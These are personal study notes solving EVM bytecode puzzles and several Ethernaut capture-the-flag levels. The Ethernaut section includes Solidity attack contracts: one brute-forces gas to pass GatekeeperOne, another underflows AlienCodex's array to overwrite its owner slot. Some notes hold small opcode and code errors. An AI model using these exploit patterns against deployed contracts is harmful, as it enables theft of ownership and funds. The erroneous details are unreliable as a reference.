
# EVM Puzzles

- Puzzle 1
	- 8
	- why?
		- `CALLVALUE` gets the `value` into the stack
		- `JUMP` is using that value from the stack to do the jump
		- therefore it needs `8` to hump to `JUMPDEST`

[[-01 Attachments/f5ad15e1c9eac1e28f8c3edf0d5a7a25_MD5.jpeg|Open: Screenshot 2025-03-11 at 4.40.50 PM.png]]
![[-01 Attachments/f5ad15e1c9eac1e28f8c3edf0d5a7a25_MD5.jpeg]]

- Puzzle 2
	- seems that we need to have a gas value that will match the hump to the 6th position to `JUMPDEST`
		- I noticed that using 0 wei will lead to a stack with `a` which is 10 in decimal or `1010` in binary
		- I used [that playground from JUMP instruction to understand how it works](https://www.evm.codes/playground?unit=Wei&codeType=Mnemonic&code=%27wWZjump%20overqinvalid%20and%20jusXgoYoqpushk4x0_%20%20%20x2%20%7Bprevious%20instruction%20occupies%202%20bytes%7DzINVALIDx3_DEST~4k1x5%27~%20wOffseXz%5Cnx%20~w%2F%2F%20qYhZkzPUSH1%20_zJUMPZe%20Y%20tXt%20%01XYZ_kqwxz~_)
	- why
		- `CALLVALUE` add the `value` into the stack
			- gas 2
		- `CODESIZE` add 10 into the stack
			- because the set of instruction is from 0 to 9, therefore 10
			- gas 2
		- `SUB` will subtract what's in the stack
			- since if we use `0` as value, we have `a` (10) so that mean it's `CODESIZE-CALLVALUE`
			- so i need to have a value that allow me to jump 2 instructions
			- gas 3
		- `JUMP` 
					- I deducted that if we need to jump to `[06]` and that `CODESIZE` is `10`, then the value is `4`
			- gas 8
	- Value is `4`
- Puzzle 3
	- `CALLDATASIZE` is the byte size of the calldata
		- for example `0xff` will have a value of 1 with that instruction
			- so `0xffffffff` will have a value of 4! See what it means?!
	- Thats how we solve it, we just need `0xffffffff` as calldata!
- Puzzle 4
	- `XOR` takes two values form the stack and do a bitwise a ^ b 
		- so we need to look at the bits which means:
		```
		  1010  (10 in binary)
		⊕ 0101  (5 in binary)
		--------------
		  1111  (15 in binary = 0xf in hex)
		```
	- here we want the number 10 which is `1010` in binary which is `0a` in hex
	- `CODESIZE` is `c` which is 11 so `1011` 
	- which mean that if we need looking at my notes from [[OpCodes]] 
Using that truth table:

| A   | B   | A ⊕ B |
| --- | --- | ----- |
| 0   | 0   | 0     |
| 0   | 1   | 1     |
| 1   | 0   | 1     |
| 1   | 1   | 0     |
`1100` - c (12)
`0110` - added to the stack after which is 6
`1010` - 10

So the value is `6`

I used [that website to help me](https://www.rapidtables.com/convert/number/hex-to-decimal.html?x=C) 


- Puzzle 5
	- `DUP1` will duplicate the previous value in the stack and returns the duplicated and the orignal
	- `MUL` is simply a multiplication
	- `PUSH2` 
		- ~~`0100` so 4~~
	- `EQ` test equality
		- 1 if equal, 0 if not
		- which mean we just need to be able to have 1 or 0 to continue and pass
	- `PUSH1` 
		- `0c` so 12
	- `JUMPI` jump based on?!?!
	- we need to reach the 0c/12 instruction
	- by playing around `16` is the answer, but why?!
	- `PUSH2` mean two bytes in 16 bits 
		- so `0100` in hex is `0x0100 = (1 × 256) + (0 × 16) + (0 × 1) = 256 (decimal)`
		- So, **`PUSH2 0100` is actually pushing `256` in decimal**.
	- so yea 16 x 16 == 256
	- so if you put 16 it works
- Puzzle 6
	- `CALLDATALOAD` return a version of 32 byte of the whats in the stacl
	- we need to target the position 10, there A is 10 in hexadecimal
	- `0x000000000000000000000000000000000000000000000000000000000000000A` is the answer
- Puzzle 7

```
[00] CALLDATASIZE   // Get calldata size
[01] PUSH1 00       // Push 0
[03] DUP1           // Duplicate 0
[04] CALLDATACOPY   // Copy calldata into memory
[05] CALLDATASIZE   // Get calldata size
[06] PUSH1 00       // Push 0 (memory offset)
[08] PUSH1 00       // Push 0 (ETH value sent)
[0a] CREATE         // Deploy contract using calldata
[0b] EXTCODESIZE    // Get size of deployed contract
[0c] PUSH1 01       // Push 1
[0e] EQ             // Check if EXTCODESIZE == 1
[0f] PUSH1 13       // Push jump destination
[11] JUMPI          // Jump if EXTCODESIZE == 1
[12] REVERT         // Else revert
[13] JUMPDEST       // Valid jump destination
[14] STOP           // Stop execution successfully

```

We need a contract that `RETURN`, otherwise the deployed contract would have zero size, and `EXTCODESIZE` would return `0`, causing a **revert**.

|Opcode|Instruction|Explanation|
|---|---|---|
|`60 00`|`PUSH1 00`|Push `0x00` onto the stack (value for `MSTORE`)|
|`60 00`|`PUSH1 00`|Push `0x00` onto the stack (memory location for `MSTORE`)|
|`53`|`MSTORE`|Store `0x00` at memory offset `0x00`|
|`60 01`|`PUSH1 01`|Push `0x01` onto the stack (length of data to return)|
|`60 00`|`PUSH1 00`|Push `0x00` onto the stack (offset of return data)|
|`F3`|`RETURN`|Return **1 byte** from memory|

	`0x600060005360016000F3`

- Puzzle 8
	- `0x60FE60005360016000F3`
	- The simplest solution is to create a contract whose runtime code is just the INVALID opcode (0xFE), which is guaranteed to throw an exception when executed
	- I need to craft initialization code that returns 0xFE as the runtime code
	- This creates a contract that will throw an exception when called, making the CALL return 0, which triggers the successful path in the puzzle
	```
	60 FE      // PUSH1 0xFE (INVALID opcode)
	60 00      // PUSH1 0x00 (memory position)
	53         // MSTORE8 (store a single byte at position 0)
	60 01      // PUSH1 0x01 (size of runtime code - 1 byte)
	60 00      // PUSH1 0x00 (memory offset to return from)
	F3         // RETURN (return the single byte in memory as runtime code)
	```

- Puzzle 9
	- `0x00000000` and 2
```
CALLDATASIZE pushes 4 onto stack
PUSH1 03 pushes 3 onto stack
LT checks if 3 < 4 (true)
Jump to position 9
CALLVALUE pushes 2 onto stack
CALLDATASIZE pushes 4 onto stack again
MUL multiplies: 2 * 4 = 8
PUSH1 08 pushes 8 onto stack
EQ checks if 8 == 8 (true)
Jump to position 0x14
STOP executes successfully
```

`Callvalue (2) * Calldatasize (4) = 8` 

Therefore i need a 8 bytes calldata and 2 wei

- Puzzle 10

```
[00]    CODESIZE      // Get bytecode size (27 bytes)
[01]    CALLVALUE     // Get ETH value sent
[02]    SWAP1         // Swap stack items to [CALLVALUE, CODESIZE]
[03]    GT            // Check if CODESIZE > CALLVALUE
[04]    PUSH1 08      // Push jump destination
[06]    JUMPI         // Jump if CODESIZE > CALLVALUE
```

CALLVALUE must be less than 27

```
[08]    JUMPDEST      // Jump destination
[09]    CALLDATASIZE  // Get calldata size
[0a]    PUSH2 0003    // Push 3 (as a 2-byte value)
[0d]    SWAP1         // Stack: [3, CALLDATASIZE]
[0e]    MOD           // Calculate CALLDATASIZE % 3
[0f]    ISZERO        // Check if result is 0 (meaning divisible by 3)
[10]    CALLVALUE     // Get call value again
[11]    PUSH1 0A      // Push 10
[13]    ADD           // Calculate CALLVALUE + 10
[14]    JUMPI         // Jump to (CALLVALUE + 10) if condition met
```

so for the jump, we need a calldatasize divisible by 3, and callvalue + 10 must equal 0x19, so must be 15

I guess with `0x000000` and 15

# More EVM Puzzles


- Puzzle 1

```
00      36      CALLDATASIZE      // Push calldata size onto stack
01      34      CALLVALUE         // Push call value onto stack
02      0A      EXP               // Compute CALLVALUE^CALLDATASIZE
03      56      JUMP              // Jump to address (CALLVALUE^CALLDATASIZE)

40      5B      JUMPDEST          // Valid jump destination at 0x40 (64 in decimal)
41      58      PC                // Push PC (0x41) onto stack
42      36      CALLDATASIZE      // Push calldata size onto stack again
43      01      ADD               // Compute 0x41 + CALLDATASIZE
44      56      JUMP              // Jump to address (0x41 + CALLDATASIZE)

47      5B      JUMPDEST          // Valid jump destination at 0x47 (71 in decimal)
48      00      STOP              // Successfully stop execution

```

- From the second condition: 0x41 + CALLDATASIZE = 0x47
    - This means CALLDATASIZE = 0x47 - 0x41 = 0x06 (6 bytes)
- From the first condition: CALLVALUE^6 = 64
    - This equation has the solution CALLVALUE = 2, since 2^6 = 64

AAAAAAAH

`0x000000000000` with 2 wei

- Puzzle 2 


```
[00]	CALLDATASIZE	   // Get size of calldata
[01]	PUSH1	00         // Push 0 (memory destination)
[03]	PUSH1	00         // Push 0 (calldata offset)
[05]	CALLDATACOPY	   // Copy calldata to memory
[06]	CALLDATASIZE	   // Get size of calldata again
[07]	PUSH1	00         // Push 0 (memory offset)
[09]	PUSH1	00         // Push 0 (value)
[0b]	CREATE	           // Create contract using calldata as init code
[0c]	PUSH1	00         // Push 0 (argsSize)
[0e]	DUP1	           // Duplicate 0 (argsOffset)
[0f]	DUP1	           // Duplicate 0 (value)
[10]	DUP1	           // Duplicate 0 (addr)
[11]	DUP1	           // Duplicate 0
[12]	SWAP5	           // Swap with 5th item (addr to top)
[13]	GAS	               // Push remaining gas
[14]	CALL	           // Call the created contract
[15]	RETURNDATASIZE	   // Get size of return data
[16]	PUSH1	0a         // Push 10
[18]	EQ	               // Check if RETURNDATASIZE == 10
[19]	PUSH1	1F         // Push jump destination
[1b]	JUMPI	           // Jump if condition met
[1c]	INVALID	           // Fail if condition not met
[1f]	JUMPDEST	       // Jump destination
[20]	STOP               // Stop execution

```


more or less

```
// Initialization code
PUSH1 0x13                     // Size of runtime code (19 bytes)
PUSH1 0x0C                     // Position of runtime code
PUSH1 0x00                     // Destination in memory
CODECOPY                       // Copy code to memory
PUSH1 0x13                     // Size to return
PUSH1 0x00                     // Memory position
RETURN                         // Return runtime code

// Runtime code - will return exactly 10 bytes when called
PUSH10 0x01020304050607080910  // Push 10 bytes value
PUSH1 0x00                     // Memory position 0
MSTORE                         // Store in memory (right-aligned)
PUSH1 0x0A                     // Size 10 bytes
PUSH1 0x16                     // Memory offset 22 (32-10)
RETURN                         // Return exactly 10 bytes

```

ok so we need to make ANOTHER CONTRACT DAMN IT 

```
PUSH1 0x13                     // Size of runtime code (19 bytes)
PUSH1 0x0C                     // Position of runtime code
PUSH1 0x00                     // Destination in memory
CODECOPY                       // Copy code to memory
PUSH1 0x13                     // Size to return
PUSH1 0x00                     // Memory position
RETURN                         // Return runtime code

// Runtime code - will return exactly 10 bytes when called
PUSH10 0x01020304050607080910  // Push 10 bytes value
PUSH1 0x00                     // Memory position 0
MSTORE                         // Store in memory (right-aligned)
PUSH1 0x0A                     // Size 10 bytes
PUSH1 0x16                     // Memory offset 22 (32-10)
RETURN                         // Return exactly 10 bytes

```


calldata is `0x6013600C60003960136000F36901020304050607080910600052600A6016F3` 

- Puzzle 3

- Creates a new contract using our calldata as initialization code
- DELEGATECALL's to that contract
- Checks if storage slot 5 equals 0xAA

```
PUSH1 0x05      // Size of runtime code (5 bytes)
PUSH1 0x0C      // Position where runtime code starts
PUSH1 0x00      // Destination in memory
CODECOPY        // Copy runtime code to memory
PUSH1 0x05      // Size to return
PUSH1 0x00      // From memory position
RETURN          // Return runtime code

PUSH1 0xAA      // Value 0xAA
PUSH1 0x05      // Storage slot 5
SSTORE          // Store value
PUSH1 0x00      // Push 0 (success value)
RETURN          // Return successfully
```

`0x6005600C60003960056000F360AA6005556000F3`

Set storage slot 5 to 0xAA
Return successfully
The main contract will then check storage slot 5 and pass


- Puzzle 4
`0x60008080806002815af1` and 4 wei

```
6000       PUSH1 0x00    // Push 0 (no value to send)
8080       DUP1 DUP1     // Duplicate 0 twice for call parameters
80         DUP1          // Duplicate 0 again 
6002       PUSH1 0x02    // Push 2 (address to call)
81         DUP2          // Duplicate second value from top
5a         GAS           // Push all available gas
f1         CALL          // Call address 2 (precompiled SHA256 contract)
```


- Puzzle 5

`0x12345678901234567890123456789012345678901234567890123456789012341234567890123456789012345678901234567890123456789012345678`

- Puzzle 6

Just asking for value?!  ok!
17

i'm not sure i understood

- Puzzle 7

```
00      5A        GAS         // Store current gas value (GAS1)
01      34        CALLVALUE   // Push value sent with transaction onto stack
02      5B        JUMPDEST    // Loop start
03      6001      PUSH1 01    // Push 1 onto stack
05      90        SWAP1       // Swap 1 and CALLVALUE
06      03        SUB         // Subtract 1 from CALLVALUE
07      80        DUP1        // Duplicate the result
08      6000      PUSH1 00    // Push 0 onto stack
0A      14        EQ          // Check if result == 0
0B      6011      PUSH1 11    // Push exit address
0D      57        JUMPI       // Jump to exit if result == 0
0E      6002      PUSH1 02    // Otherwise push loop start address
10      56        JUMP        // Jump back to loop start
11      5B        JUMPDEST    // Exit point for loop
12      5A        GAS         // Store current gas value (GAS2)
13      90        SWAP1       // Swap stack elements
14      91        SWAP2       // Swap stack elements 
15      03        SUB         // Calculate GAS1 - GAS2
16      60A6      PUSH1 A6    // Push 0xA6 (166) onto stack
18      14        EQ          // Check if (GAS1 - GAS2) == 166
19      601D      PUSH1 1D    // Push success address
1B      57        JUMPI       // Jump to success if equal
1C      FD        REVERT      // Otherwise revert
1D      5B        JUMPDEST    // Success destination
1E      00        STOP        // Stop execution
```

The code creates a loop that runs CALLVALUE times (decrements CALLVALUE to 0)
It measures the gas consumed between two points (before and after the loop)
For the code to succeed, this gas consumption must be EXACTLY 166 units

Looking at the gas costs for each operation in the loop and calculating how many iterations would consume 166 gas

With 4 wei:
- The loop runs exactly 4 times
- This consumes exactly 166 gas between the two measurement points
- The transaction succeeds and the STOP opcode is reached

Answer is 4 then

- Puzzle 8

```
61      PUSH2
33ff    0x33ff (value to push)
6000    PUSH1 0x00
52      MSTORE (store 0x33ff at memory position 0)
6002    PUSH1 0x02
601e    PUSH1 0x1e
f3      RETURN (return 2 bytes from memory position 0x1e)
```

`0x6133ff6000526002601ef3`


- Puzzle 9

Value is 47

Store 47 at memory position 0:
- memory[0:32] = 0x000000000000000000000000000000000000000000000000000000000000002f
Compute keccak256 hash:
 - keccak256(0x000000000000000000000000000000000000000000000000000000000000002f)
 - = 0xa8b7f58ea2e1cfe656d2f083d350ff9c7047bebf4c10b94ce116bce40a5f67f8
Take the first byte (shift right by 248 bits):
- 0xa8
Compare with 0xA8:
- 0xa8 == 0xA8 is true

- Puzzle 10

`0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B0B`


```
00-06   // Copy first 32 bytes from calldata to memory
07-09   // Load those 32 bytes
0A-2B   // Push F0F0F0F0... mask
2C      16        AND      // AND first 32 bytes with F0F0... mask
2D-35   // Copy second 32 bytes from calldata to memory and load them
36      17        OR       // OR result of AND with second 32 bytes
37-58   // Push ABABABABAB... as target value
58-5E   // Check if result equals ABABAB..., success if it does
```

This code is checking if the following equation is satisfied: `(first_32_bytes & 0xF0F0F0...) | second_32_bytes = 0xABABAB...`

- `0xF0` in binary is `11110000` (mask keeps high 4 bits, zeros low 4 bits)
- `0xAB` in binary is `10101011` (target value)
- `0xAA` in binary is `10101010` (first 32 bytes)
- `0x0B` in binary is `00001011` (second 32 bytes)
- 
When we do the operations:
1. `0xAA & 0xF0 = 0xA0` (keeps only the high 4 bits of 0xAA)
2. `0xA0 | 0x0B = 0xAB` (combines high bits from first part with low bits from second part)

With the full 64 bytes:
- First 32 bytes of all AA's: provides the high 4 bits of each byte
- Second 32 bytes of alternating 0B's: provides the low 4 bits of each byte
- After AND+OR operations: produces exactly ABABAB... which is the target value


# Ethernaut

[x] - Ethernaut 8
[x] - Ethernaut 12
[x] - Ethernaut 13
[x] - Ethernaut 18
[] - Ethernaut 19


- Ethernaut 13


We need to find that:
```
key = unit64(_gateKey)
uint32(key) == unit16(key)
uint32(key) != key
uint32(key) == uint16(uint160(tx.origin))
```

If we have a bigger number, it might cut off the bits from the left 

```
uint64 k64 = uint64(1 << 63) + uint64(k16);
bytes8 key = bytes8(k64)
```



```

contract Hack {
    
    GatekeeperOne victim;
    
    constructor(address _victim) {
        victim = GatekeeperOne(_victim);
        uint16 keyOrigin = uint16(uint160(tx.origin));
        uint64 keyBits = uint64(1 << 63) + uint64(keyOrigin);
        bytes8 key = bytes8(keyBits);
		for (uint256 i = 0; i < 8191; i++) {
            (bool result, ) = address(victim).call{gas: 24000 + i}(
                abi.encodeWithSignature(("enter(bytes8)"), key)
            );
            if (result) {
                break;
            }
        }
    }
}
```

- Ethernaut 18

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNumSolver {
    constructor(address target) {
        bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
        address addr;

        assembly {
            addr := create(0, add(bytecode, 0x20), 0x13)
        }

        require(addr != address(0));
        target.setSolver(addr);
    }
}

contract MagicNum {
    address public solver;

    constructor() {}

    function setSolver(address _solver) public {
        solver = _solver;
    }

    /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
    */
}
```

like https://solidity-by-example.org/app/simple-bytecode-contract/

- Ethernaut 19


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;


import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/ownership/Ownable.sol";

contract Hack {
    constructor(AlienCodex victim) public {
        victim.makeContact();
        victim.retract();
        uint256 keccak_1 = uint256(keccak256(abi.encode(1)));
        // have to do -1 +1
        uint256 i = 2**256 - 1 - keccak_1 + 1; 
        victim.revise(i, bytes32(uint256(msg.sender)));
    }
}


contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}```

